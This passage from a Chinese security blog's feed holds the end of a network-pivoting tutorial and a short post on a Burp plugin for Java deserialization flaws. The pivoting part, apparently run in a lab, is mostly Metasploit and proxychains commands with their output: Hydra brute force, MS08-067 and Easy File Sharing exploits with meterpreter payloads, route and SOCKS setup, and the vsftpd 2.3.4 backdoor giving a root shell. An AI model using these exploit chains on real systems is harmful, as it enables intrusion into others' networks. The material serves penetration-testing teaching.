class="line">|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (http://www.thc.org/thc-hydra) finished</span><br><span class="line">root@kali:~#</span><br></pre></td></tr></tbody></table></figure>

<p>使用Hydra执行brute-force攻击，我们获得代理服务器的用户名为admin，密码为123456。同时使用ProxyChains工具可以连接到远程的SSH服务</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">root@kali:~# proxychains ssh admin@7.7.7.20</span><br><span class="line">ProxyChains-3.1 (http://proxychains.sf.net)</span><br><span class="line">|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">The authenticity of host '7.7.7.20 (7.7.7.20)' can't be established.</span><br><span class="line">ECDSA key fingerprint is SHA256:Rcz2KrPF3BTo16Ng1kET91ycbr9c8vOkZcZ6b4VawMQ.</span><br><span class="line">Are you sure you want to continue connecting (yes/no)? yes</span><br><span class="line">Warning: Permanently added '7.7.7.20' (ECDSA) to the list of known hosts.</span><br><span class="line">admin@7.7.7.20's password:</span><br><span class="line">bvshell:/C/Documents and Settings/All Users$ pwd</span><br><span class="line">/C/Documents and Settings/All Users</span><br><span class="line">bvshell:/C/Documents and Settings/All Users$ dir</span><br><span class="line">2016-12-24  21:32          &lt;DIR&gt; Application Data</span><br><span class="line">2016-12-25  06:16          &lt;DIR&gt; Desktop</span><br><span class="line">2016-12-24  18:36          &lt;DIR&gt; Documents</span><br><span class="line">2016-12-24  18:37          &lt;DIR&gt; DRM</span><br><span class="line">2016-12-24  21:32          &lt;DIR&gt; Favorites</span><br><span class="line">2016-12-24  18:38          &lt;DIR&gt; Start Menu</span><br><span class="line">2016-12-24  21:32          &lt;DIR&gt; Templates</span><br><span class="line">      0 Files                  0 bytes</span><br><span class="line">      7 Directories</span><br><span class="line">bvshell:/C/Documents and Settings/All Users$</span><br></pre></td></tr></tbody></table></figure>

<h2 id="获取第二层中转跳板的访问"><a href="#获取第二层中转跳板的访问" class="headerlink" title="获取第二层中转跳板的访问"></a>获取第二层中转跳板的访问</h2><p>如果你还记得，我们之前使用nmap扫描7.7.7.0/24找到了两个漏洞。一个是MS08-067，另一个是Easy File Share应用中的BOF漏洞，这两个方向都能让我们访问到目标主机。当然还有一个选择便是继续使用上面获取到的ssh进行访问，但这里我们选择以上两个方向。</p>
<h3 id="MS08-067搭配Bind-TCP"><a href="#MS08-067搭配Bind-TCP" class="headerlink" title="MS08-067搭配Bind TCP"></a>MS08-067搭配Bind TCP</h3><p>该模块的完整路径为exploit/windows/smb/ms08_067_netapi，在Metasploit框架下利用MS08-067漏洞攻击目标系统。由于没有定义双向路由，目标系统无法直接到达我们的计算机，为此需要将bind_tcp设置为payload类型。在exploit操作成功之后，就将要对连接到目标系统的端口进行监听。bind_tcp和reverse_tcp的区别如下图：</p>
<p><img src="https://b3logfile.com/file/2020/05/solofetchupload651022899957203843-aaf1e449.jpeg" alt=""></p>
<p>完整设置如下：</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">msf &gt; use exploit/windows/smb/ms08_067_netapi</span><br><span class="line">msf exploit(ms08_067_netapi) &gt; show options</span><br><span class="line">Module options (exploit/windows/smb/ms08_067_netapi):</span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   RHOST                     yes       The target address</span><br><span class="line">   RPORT    445              yes       The SMB service port</span><br><span class="line">   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)</span><br><span class="line">Exploit target:</span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic Targeting</span><br><span class="line">msf exploit(ms08_067_netapi) &gt; set rhost 7.7.7.20</span><br><span class="line">rhost =&gt; 7.7.7.20</span><br><span class="line">msf exploit(ms08_067_netapi) &gt; set payload windows/meterpreter/bind_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/bind_tcp</span><br><span class="line">msf exploit(ms08_067_netapi) &gt; show options</span><br><span class="line">Module options (exploit/windows/smb/ms08_067_netapi):</span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   RHOST    7.7.7.20         yes       The target address</span><br><span class="line">   RPORT    445              yes       The SMB service port</span><br><span class="line">   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)</span><br><span class="line">Payload options (windows/meterpreter/bind_tcp):</span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line">   RHOST     7.7.7.20         no        The target address</span><br><span class="line">Exploit target:</span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic Targeting</span><br><span class="line">msf exploit(ms08_067_netapi) &gt; run</span><br><span class="line">[*] Started bind handler</span><br><span class="line">[*] 7.7.7.20:445 - Automatically detecting the target...</span><br><span class="line">[*] 7.7.7.20:445 - Fingerprint: Windows 2003 - Service Pack 2 - lang:Unknown</span><br><span class="line">[*] 7.7.7.20:445 - We could not detect the language pack, defaulting to English</span><br><span class="line">[*] 7.7.7.20:445 - Selected Target: Windows 2003 SP2 English (NX)</span><br><span class="line">[*] 7.7.7.20:445 - Attempting to trigger the vulnerability...</span><br><span class="line">[*] Sending stage (957999 bytes) to 7.7.7.20</span><br><span class="line">[*] Meterpreter session 2 opened (172.16.0.20-172.16.0.11:0 -&gt; 7.7.7.20:4444)</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></tbody></table></figure>

<h3 id="Easy-File-Share应用的BoF漏洞"><a href="#Easy-File-Share应用的BoF漏洞" class="headerlink" title="Easy File Share应用的BoF漏洞"></a>Easy File Share应用的BoF漏洞</h3><p>另一个漏洞就是有关于Easy File Share应用的了。可通过以下步骤进行设置</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">msf  &gt; use exploit/windows/http/easyfilesharing_seh</span><br><span class="line">msf exploit(easyfilesharing_seh) &gt; show options</span><br><span class="line">Module options (exploit/windows/http/easyfilesharing_seh):</span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   RHOST                   yes       The target address</span><br><span class="line">   RPORT  80               yes       The target port</span><br><span class="line">Exploit target:</span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Easy File Sharing 7.2 HTTP</span><br><span class="line">msf exploit(easyfilesharing_seh) &gt; set rhost 7.7.7.20</span><br><span class="line">rhost =&gt; 7.7.7.20</span><br><span class="line">msf exploit(easyfilesharing_seh) &gt; set payload windows/meterpreter/bind_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/bind_tcp</span><br><span class="line">msf exploit(easyfilesharing_seh) &gt; run</span><br><span class="line">[*] Started bind handler</span><br><span class="line">[*] 7.7.7.20:80 - 7.7.7.20:80 - Sending exploit...</span><br><span class="line">[+] 7.7.7.20:80 - Exploit Sent</span><br><span class="line">[*] Sending stage (957999 bytes) to 7.7.7.20</span><br><span class="line">[*] Meterpreter session 2 opened (172.16.0.20-172.16.0.11:0 -&gt; 7.7.7.20:4444) at 2016-12-26 14:21:11 +0300</span><br><span class="line">meterpreter &gt; ipconfig</span><br><span class="line">Interface  1</span><br><span class="line">============</span><br><span class="line">Name         : MS TCP Loopback interface</span><br><span class="line">Hardware MAC : 00:00:00:00:00:00</span><br><span class="line">MTU          : 1520</span><br><span class="line">IPv4 Address : 127.0.0.1</span><br><span class="line">Interface 65539</span><br><span class="line">============</span><br><span class="line">Name         : Intel(R) PRO/1000 MT Desktop Adapter</span><br><span class="line">Hardware MAC : 08:00:27:29:cd:cb</span><br><span class="line">MTU          : 1500</span><br><span class="line">IPv4 Address : 8.8.8.3</span><br><span class="line">IPv4 Netmask : 255.255.255.0</span><br><span class="line">Interface 65540</span><br><span class="line">============</span><br><span class="line">Name         : Intel(R) PRO/1000 MT Desktop Adapter #2</span><br><span class="line">Hardware MAC : 08:00:27:e3:47:43</span><br><span class="line">MTU          : 1500</span><br><span class="line">IPv4 Address : 7.7.7.20</span><br><span class="line">IPv4 Netmask : 255.255.255.0</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></tbody></table></figure>

<p>攻击流程如下图</p>
<p><img src="https://b3logfile.com/file/2020/05/solofetchupload7160381282705997673-e00a99d4.jpeg" alt=""></p>
<p>由于我们可以访问到7.7.7.20机器，我们需要再次执行信息收集。被命名为JC的机器和RD机器一样有两张网卡，这也意味着我们找到了第二个隐藏网络(8.8.8.0/24)</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">meterpreter &gt; ipconfig</span><br><span class="line">Interface  1</span><br><span class="line">============</span><br><span class="line">Name         : MS TCP Loopback interface</span><br><span class="line">Hardware MAC : 00:00:00:00:00:00</span><br><span class="line">MTU          : 1520</span><br><span class="line">IPv4 Address : 127.0.0.1</span><br><span class="line">Interface 65539</span><br><span class="line">============</span><br><span class="line">Name         : Intel(R) PRO/1000 MT Desktop Adapter</span><br><span class="line">Hardware MAC : 08:00:27:29:cd:cb</span><br><span class="line">MTU          : 1500</span><br><span class="line">IPv4 Address : 8.8.8.3</span><br><span class="line">IPv4 Netmask : 255.255.255.0</span><br><span class="line">Interface 65540</span><br><span class="line">============</span><br><span class="line">Name         : Intel(R) PRO/1000 MT Desktop Adapter #2</span><br><span class="line">Hardware MAC : 08:00:27:e3:47:43</span><br><span class="line">MTU          : 1500</span><br><span class="line">IPv4 Address : 7.7.7.20</span><br><span class="line">IPv4 Netmask : 255.255.255.0</span><br></pre></td></tr></tbody></table></figure>

<p>在第二个隐藏网络下执行Arp扫描继续收集信息</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/arp_scanner RHOSTS=8.8.8.0/24</span><br><span class="line">[*] Running module against SRV03</span><br><span class="line">[*] ARP Scanning 8.8.8.0/24</span><br><span class="line">[*]   IP: 8.8.8.3 MAC 08:00:27:29:cd:cb (CADMUS COMPUTER SYSTEMS)</span><br><span class="line">[*]   IP: 8.8.8.1 MAC 0a:00:27:00:00:03 (UNKNOWN)</span><br><span class="line">[*]   IP: 8.8.8.9 MAC 08:00:27:56:f1:7c (CADMUS COMPUTER SYSTEMS)</span><br><span class="line">[*]    IP: 8.8.8.13 MAC 08:00:27:13:a3:b1 (CADMUS COMPUTER SYSTEMS)</span><br></pre></td></tr></tbody></table></figure>

<p>ARP扫描结果显示在该网络下存在4台机器</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -s 8.8.8.0/24</span><br><span class="line">[*] Adding a route to 8.8.8.0/255.255.255.0...</span><br><span class="line">[+] Added route to 8.8.8.0/255.255.255.0 via 7.7.7.20</span><br><span class="line">[*] Use the -p option to list all active routes</span><br><span class="line">msf &gt; route print</span><br><span class="line">Active Routing Table</span><br><span class="line">====================</span><br><span class="line"> Subnet Netmask Gateway</span><br><span class="line"> ------ ------- -------</span><br><span class="line"> 7.7.7.0 255.255.255.0 Session 1</span><br><span class="line"> 8.8.8.0 255.255.255.0 Session 3</span><br></pre></td></tr></tbody></table></figure>

<p>之后再次添加路由规则</p>
<h2 id="两层层中转跳板"><a href="#两层层中转跳板" class="headerlink" title="两层层中转跳板"></a>两层层中转跳板</h2><p>在JC主机上收集信息时发现了8.8.8.0/24网络，另外之前我们就已经建立了172.16.0.0/24到7.7.7.0/24网络的路由规则。<br>在当前的情况下，网络数据包从172.16.0.20发到JC设备(第二层中转跳板)，数据首先要发到RD设备(第一层中转跳板)，然后RD主机再将数据传送到JC主机。如果攻击者(172.16.0.20)想将数据发送到8.8.8.0/24网络(发现的第二个隐藏网络)的任何一个主机时，就得建立一个新的路由规则。为了使用Metasploit框架以外的其他工具，我们必须运行一个socks4代理服务来连接两个跳板主机，并在proxychains工具的配置文件中重新定义新的代理服务器。</p>
<p>攻击者机器(172.16.0.20)尝试向8.8.8.9发送网络数据包，要经过以下中转：</p>
<ul>
<li>RD：我不知道怎么访问到8.8.8.9，但我知道哪个系统能访问到它，我可以将数据发给它。</li>
<li>JC：我知道怎么将数据从7.7.7.0/24网络发送到8.8.8.0/24网络。</li>
</ul>
<p>数据流如下图所示：</p>
<p><img src="https://b3logfile.com/file/2020/05/solofetchupload3944527952613210767-26225692.jpeg" alt=""></p>
<h2 id="神器Proxychains"><a href="#神器Proxychains" class="headerlink" title="神器Proxychains"></a>神器Proxychains</h2><p>Proxychains工具负责连接代理服务器以及端对端的传输。在最后阶段，需要为新发现的8.8.8.0/24网络在本地1081端口设置一个新的socks4代理服务。</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">msf exploit(ms08_067_netapi) &gt; use auxiliary/server/socks4a</span><br><span class="line">msf auxiliary(socks4a) &gt; show options</span><br><span class="line">Module options (auxiliary/server/socks4a):</span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   SRVHOST  172.16.0.20      yes       The address to listen on</span><br><span class="line">   SRVPORT  1080             yes       The port to listen on.</span><br><span class="line">Auxiliary action:</span><br><span class="line">   Name   Description</span><br><span class="line">   ----   -----------</span><br><span class="line">   Proxy  </span><br><span class="line">msf auxiliary(socks4a) &gt; set SRVPORT 1081</span><br><span class="line">SRVPORT =&gt; 1081</span><br><span class="line">msf auxiliary(socks4a) &gt; run</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line">[*] Starting the socks4a proxy server</span><br><span class="line">msf auxiliary(socks4a) &gt;</span><br></pre></td></tr></tbody></table></figure>

<p>在/etc/proxychains.conf配置文件中添加新的代理服务器。通过激活动态链设置，确保在不同的代理服务器之间能够正常切换。</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">root@kali:~# cat /etc/proxychains.conf | grep -v "#"</span><br><span class="line">dynamic_chain</span><br><span class="line">proxy_dns</span><br><span class="line">tcp_read_time_out 15000</span><br><span class="line">tcp_connect_time_out 8000</span><br><span class="line">socks4  172.16.0.20 1080  # First Pivot</span><br><span class="line">socks4  172.16.0.20 1081  # Second Pivot</span><br></pre></td></tr></tbody></table></figure>

<p>Proxychains工具通过第二层跳板主机，可以对8.8.8.0/24目标网络进行nmap扫描：</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">root@kali:~# proxychains nmap -sT -sV -p21,22,23,80 8.8.8.9 -n -Pn -vv</span><br><span class="line">ProxyChains-3.1 (http://proxychains.sf.net)</span><br><span class="line">Starting Nmap 7.25BETA1 ( https://nmap.org )</span><br><span class="line">Nmap wishes you a merry Christmas! Specify -sX for Xmas Scan (https://nmap.org/book/man-port-scanning-techniques.html).</span><br><span class="line">NSE: Loaded 36 scripts for scanning.</span><br><span class="line">Initiating Connect Scan</span><br><span class="line">Scanning 8.8.8.9 [4 ports]</span><br><span class="line">|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;-172.16.0.20:1081-&lt;&gt;&lt;&gt;-8.8.8.9:21-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">Discovered open port 21/tcp on 8.8.8.9</span><br><span class="line">|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;-172.16.0.20:1081-&lt;&gt;&lt;&gt;-8.8.8.9:23-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">Discovered open port 23/tcp on 8.8.8.9</span><br><span class="line">|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;-172.16.0.20:1081-&lt;&gt;&lt;&gt;-8.8.8.9:22-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">Discovered open port 22/tcp on 8.8.8.9</span><br><span class="line">|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;-172.16.0.20:1081-&lt;&gt;&lt;&gt;-8.8.8.9:80-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">Discovered open port 80/tcp on 8.8.8.9</span><br><span class="line">Completed Connect Scan at 05:54, 1.37s elapsed (4 total ports)</span><br><span class="line">Initiating Service scan at 05:54</span><br><span class="line">Scanning 4 services on 8.8.8.9</span><br><span class="line">|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;-172.16.0.20:1081-&lt;&gt;&lt;&gt;-8.8.8.9:21-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;-172.16.0.20:1081-&lt;&gt;&lt;&gt;-8.8.8.9:22-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;-172.16.0.20:1081-&lt;&gt;&lt;&gt;-8.8.8.9:23-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;-172.16.0.20:1081-&lt;&gt;&lt;&gt;-8.8.8.9:80-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">Completed Service scan at 05:54, 11.09s elapsed (4 services on 1 host)</span><br><span class="line">NSE: Script scanning 8.8.8.9.</span><br><span class="line">NSE: Starting runlevel 1 (of 2) scan.</span><br><span class="line">Initiating NSE at 05:54</span><br><span class="line">|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;-172.16.0.20:1081-&lt;&gt;&lt;&gt;-8.8.8.9:80-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;-172.16.0.20:1081-&lt;&gt;&lt;&gt;-8.8.8.9:80-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">Completed NSE at 05:54, 1.71s elapsed</span><br><span class="line">NSE: Starting runlevel 2 (of 2) scan.</span><br><span class="line">Initiating NSE at 05:54</span><br><span class="line">Completed NSE at 05:54, 0.00s elapsed</span><br><span class="line">Nmap scan report for 8.8.8.9</span><br><span class="line">Host is up, received user-set (0.41s latency).</span><br><span class="line">Scanned</span><br><span class="line">PORT   STATE SERVICE REASON  VERSION</span><br><span class="line">21/tcp open  ftp     syn-ack vsftpd 2.3.4</span><br><span class="line">22/tcp open  ssh     syn-ack OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)</span><br><span class="line">23/tcp open  telnet  syn-ack Linux telnetd</span><br><span class="line">80/tcp open  http    syn-ack Apache httpd 2.2.8 ((Ubuntu) DAV/2)</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 14.59 seconds</span><br><span class="line">root@kali:~#</span><br></pre></td></tr></tbody></table></figure>

<p>以上，数据包穿透第一层代理服务器，又经过我们定义的第二层代理服务器，最终到达目的地。对扫描结果进行分析，发现8.8.8.9上安装的vsftpd版本存在漏洞。以下步骤为在Metasploit框架中设置vsftpd利用模块进行攻击：</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">msf &gt;</span><br><span class="line">msf &gt; use exploit/unix/ftp/vsftpd_234_backdoor</span><br><span class="line">msf exploit(vsftpd_234_backdoor) &gt; show options</span><br><span class="line">Module options (exploit/unix/ftp/vsftpd_234_backdoor):</span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   RHOST                   yes       The target address</span><br><span class="line">   RPORT  21               yes       The target port</span><br><span class="line">Exploit target:</span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line">msf exploit(vsftpd_234_backdoor) &gt; set rhost 8.8.8.9</span><br><span class="line">rhost =&gt; 8.8.8.9</span><br><span class="line">msf exploit(vsftpd_234_backdoor) &gt; run</span><br><span class="line">[*] 8.8.8.9:21 - Banner: 220 (vsFTPd 2.3.4)</span><br><span class="line">[*] 8.8.8.9:21 - USER: 331 Please specify the password.</span><br><span class="line">[+] 8.8.8.9:21 - Backdoor service has been spawned, handling...</span><br><span class="line">[+] 8.8.8.9:21 - UID: uid=0(root) gid=0(root)</span><br><span class="line">[*] Found shell.</span><br><span class="line">[*] Command shell session 4 opened (Local Pipe -&gt; Remote Pipe)</span><br><span class="line">pwd</span><br><span class="line">/</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root)</span><br><span class="line">ifconfig</span><br><span class="line">eth0      Link encap:Ethernet  HWaddr 08:00:27:56:f1:7c  </span><br><span class="line">          inet addr:8.8.8.9  Bcast:8.8.8.255  Mask:255.255.255.0</span><br><span class="line">          inet6 addr: fe80::a00:27ff:fe56:f17c/64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:10843 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:2779 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000</span><br><span class="line">          RX bytes:1081842 (1.0 MB)  TX bytes:661455 (645.9 KB)</span><br><span class="line">          Base address:0xd010 Memory:f0000000-f0020000</span><br><span class="line">lo        Link encap:Local Loopback  </span><br><span class="line">          inet addr:127.0.0.1  Mask:255.0.0.0</span><br><span class="line">          inet6 addr: ::1/128 Scope:Host</span><br><span class="line">          UP LOOPBACK RUNNING  MTU:16436  Metric:1</span><br><span class="line">          RX packets:18161 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:18161 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:0</span><br><span class="line">          RX bytes:5307479 (5.0 MB)  TX bytes:5307479 (5.0 MB)</span><br></pre></td></tr></tbody></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>攻击者通过以下步骤，发现了2个不同的隐藏网络：</p>
<p>1.攻击者控制了RD主机，该主机和攻击机在同一个网络中</p>
<p>2.得知RD主机有2张网卡</p>
<p>3.通过使用autoroute post模块，定义一个路由规则</p>
<p>4.攻击者对7.7.7.0/24网络执行ARP和NMAP扫描，之后发现了命名为JC的主机</p>
<p>5.JC存在两个不同的漏洞，分别为MS08_067和Easy File Share应用的BOF漏洞</p>
<p>6.成功利用MS08_067漏洞，获取7.7.7.20访问</p>
<p>7.继续收集信息，发现JC也有2张网卡</p>
<p>8.在7.7.7.20上添加第二个路由规则</p>
<p>9.对8.8.8.0/24网络执行ARP和NMAP扫描</p>
<p>10.在命名为SK的8.8.8.9机器上发现存在漏洞的vsftp版本</p>
<p>11.结束</p>
<p><img src="https://b3logfile.com/file/2020/05/solofetchupload576147809014467733-b89006f7.jpeg" alt=""></p>
<!--
<div class="poem-wrap">
  <div class="poem-border poem-left"></div>
  <div class="poem-border poem-right"></div>
    <h1>念两句诗</h1>
    <p id="poem">挑选中...</p>
    <p id="info">

  <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
  <script type="text/javascript">
    jinrishici.load(function(result) {
      poem.innerHTML = result.data.content
      info.innerHTML = '【' + result.data.origin.dynasty + '】' + result.data.origin.author + '《' + result.data.origin.title + '》'
      document.getElementById("poem").value(poem);
      document.getElementById("info").value(info);  
  });
  </script>
</div>
-->

<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>技术基础</tag>
        <tag>渗透测试</tag>
        <tag>网络穿透</tag>
        <tag>透视攻击</tag>
      </tags>
  </entry>
  <entry>
    <title>使用Burp插件Java-Deserialization-Scanner检测java反序列化漏洞</title>
    <url>/posts/2639883394/</url>
    <content><![CDATA[<br>
<blockquote class="blockquote-center">
<p id="hitokoto"></p>
<script src="https://v1.hitokoto.cn/?encode=js&amp;select=%23hitokoto" defer=""></script>
</blockquote>

<h4 id="本文内容"><a href="#本文内容" class="headerlink" title="本文内容"></a>本文内容</h4><p>　　本文主要介绍了在java反序列化漏洞检测过程中常用的Burp插件Java-Deserialization-Scanner的使用。</p>
<h4 id="插件介绍与安装"><a href="#插件介绍与安装" class="headerlink" title="插件介绍与安装"></a>插件介绍与安装</h4><h5 id="插件介绍"><a href="#插件介绍" class="headerlink" title="插件介绍"></a>插件介绍</h5><p>　　Java反序列化扫描器是一个Burp套件插件，旨在检测和利用Java反序列化漏洞。它是由Mediaservice.net的安全顾问Federico Dotta撰写的。</p>
<p>　　这个插件由三个不同的组件组成:<br>　　　1.与Burp套件集成主动式和被动式扫描器<br>　　　2.Manual tester，用于检测自定义插入点上的Java反序列化漏洞<br>　　　3.允许使用frohoff ysoserial积极利用Java反序列化漏洞的开发者(<a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial</a>))</p>
<h5 id="插件安装步骤"><a href="#插件安装步骤" class="headerlink" title="插件安装步骤"></a>插件安装步骤</h5><ol>
<li>下载 Burp Suite: <a href="http://portswigger.net/burp/download.html" target="_blank" rel="noopener">http://portswigger.net/burp/download.html</a></li>
<li>使用下面的步骤从 BApp Store 下载安装Java Deserialization Scanneror:</li>
<li>下载最新发布的Java Deserialization Scanner（本文选择后面这种方式）</li>
<li>打开burp，通过Burp -&gt; Extender -&gt; Extensions -&gt; Add -&gt; Choose JavaDeserializationScannerXX.jar file</li>
</ol>
<p><img src="https://img.hacpai.com/file/2020/05/image-5b02f784.png" alt="image.png"><br><img src="https://img.hacpai.com/file/2020/05/image-795ca23e.png" alt="image.png"><br><img src="https://img.hacpai.com/file/2020/05/image-a32f755c.png" alt="image.png"><br><img src="https://img.hacpai.com/file/2020/05/image-b127d8b5.png" alt="image.png"></p>
<p><img src="https://img.hacpai.com/file/2020/05/image-dadd417f.png" alt="image.png"></p>
<h4 id="检测流程"><a href="#检测流程" class="headerlink" title="检测流程"></a>检测流程</h4><p>　　插件作者很贴心，不仅写了个这么棒的插件，还附带了很多<a href="https://github.com/federicodotta/Java-Deserialization-Scanner/tree/master/test" target="_blank" rel="noopener">示例</a>。以 sampleCommonsCollections3 为例介绍该插件的使用。<br>　　首先在 tomcat 中把 这个 <a href="https://github.com/federicodotta/Java-Deserialization-Scanner/blob/master/test/sampleCommonsCollections3.war" target="_blank" rel="noopener">war </a>包部署好（这个相信大家没有问题）。该插件检测反序列化漏洞就是基于一些已知库中的gadget（依赖于 <a href="https://github.com/frohoff/ysoserial.git" target="_blank" rel="noopener">ysoserial</a>）进行检测。具体步骤如下：</p>
<h5 id="1-web端启动访问"><a href="#1-web端启动访问" class="headerlink" title="1.web端启动访问"></a>1.web端启动访问</h5><p><img src="https://img.hacpai.com/file/2020/05/image-0dafffc1.png" alt="image.png"></p>
<h5 id="2-BURP启动监听抓包"><a href="#2-BURP启动监听抓包" class="headerlink" title="2.BURP启动监听抓包"></a>2.BURP启动监听抓包</h5><p>点击Serialized Java Object in body，并在burp端抓包。</p>
<p><img src="https://img.hacpai.com/file/2020/05/image-fff25871.png" alt="image.png"></p>
<p>抓包如下：</p>
<p><img src="https://img.hacpai.com/file/2020/05/image-7d58e0e3.png" alt="image.png"></p>
<p>右键选择Send request to DS-Manual testing</p>
<p><img src="https://img.hacpai.com/file/2020/05/image-8f0b1e36.png" alt="image.png"></p>
<p>选择POST数据包，按照图示顺序设置插入点，选择DNS方式查找漏洞，点击attack发起攻击</p>
<p><img src="https://img.hacpai.com/file/2020/05/image-dd3a572b.png" alt="image.png"></p>
<p>过一段时间后，在右侧窗口就会看到检测结果。</p>
<p><img src="https://img.hacpai.com/file/2020/05/image-dc120b57.png" alt="image.png"></p>
<p>可以看到，漏洞组件为Apache Commons Collections 3,在POST数据右键选择Send to Exploitation tab</p>
<p><img src="https://img.hacpai.com/file/2020/05/image-e8b6e27d.png" alt="image.png"></p>
<p>切换到Exploiting窗口，在下方红色位置输入组件名及要执行的命令，点击attack观察结果。</p>
<p><img src="https://img.hacpai.com/file/2020/05/image-45e8b795.png" alt="image.png"></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>　　本文主要介绍了burp下java反序列化漏洞插件Java-Deserialization-Scanner的安装与配置，并通过部署实际的案例对具体使用方法进行了介绍，以便后续需要。</p>
<h4 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h4><ul>
<li>1020.Burp Suite扩展之Java-Deserialization-Scanner<ul>
<li><a href="https://www.cnblogs.com/yh-ma/p/10299289.html" target="_blank" rel="noopener">https://www.cnblogs.com/yh-ma/p/10299289.html</a></li>
</ul>
</li>
<li>Java Deserialization Scanner<ul>
<li><a href="https://github.com/federicodotta/Java-Deserialization-Scanner" target="_blank" rel="noopener">https://github.com/federicodotta/Java-Deserialization-Scanner</a></li>
</ul>
</li>
</ul>
<!--
<div class="poem-wrap">
  <div class="poem-border poem-left"></div>
